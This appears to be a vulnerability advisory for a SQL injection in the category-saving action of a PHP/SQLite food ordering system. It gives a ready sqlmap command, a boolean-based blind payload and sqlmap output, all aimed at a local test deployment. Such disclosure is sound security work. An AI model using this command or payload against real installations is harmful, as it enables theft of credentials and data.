# SQL Injection in Online Food Ordering System (Category Management)

## Overview

* **Vulnerability Type**: SQL Injection
* **Vendor**: SourceCodester
* **Product**: [Online Food Ordering System](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
* **Version**: 1.0
* **Component**: Category Management (`Actions.php?a=save_category`)
* **Vulnerable Parameter**: `name` (POST)

## Description

A SQL Injection vulnerability exists in **Online Food Ordering System v1.0**. The vulnerability is located in the `Actions.php` file, specifically within the `save_category` action (used for creating or updating food categories).

The application fails to properly sanitize the `name` parameter in the HTTP POST request before processing it in a SQL query. This allows an authenticated attacker (or administrator) to inject arbitrary SQL commands. Since the backend database is **SQLite**, attackers can exploit this using Boolean-based blind injection techniques to enumerate database structures and exfiltrate sensitive data.

## Steps to Reproduce

1. **Setup**: Deploy the Online Food Ordering System locally.
2. **Login**: Log in to the application as an administrator.
3. **Exploit**: Run `sqlmap` against the captured request targeting the `name` parameter.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8088/Actions.php?a=save_category" \
--data "id=&name=Test+Category&status=1" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Referer: http://127.0.0.1:8088/admin/?page=maintenance" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Boolean-based Blind Payload:**

```sql
name=Test Category' AND 4458=4458 AND 'uFPE'='uFPE

```

## Proof of Concept

The following output from `sqlmap` confirms that the `name` parameter in the `save_category` action is vulnerable to Boolean-based blind SQL injection.

```text
sqlmap identified the following injection point(s) with a total of 183 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=&name=Test Category' AND 4458=4458 AND 'uFPE'='uFPE&status=1
    Vector: AND [INFERENCE]
---
[INFO] the back-end DBMS is SQLite
web server operating system: Linux Debian
web application technology: PHP 8.0.30, Apache 2.4.56
back-end DBMS: SQLite

```

<img width="839" height="250" alt="图片" src="https://github.com/user-attachments/assets/beab5564-1e65-4587-9681-8e05221fbd47" />

There is also a time-based SQL injection vulnerability here, as demonstrated below.
<img width="1045" height="574" alt="图片" src="https://github.com/user-attachments/assets/76ad1475-ab03-4639-9be6-e0c44f73af5b" />



## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Retrieve sensitive information from the SQLite database, including user credentials and configuration settings.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
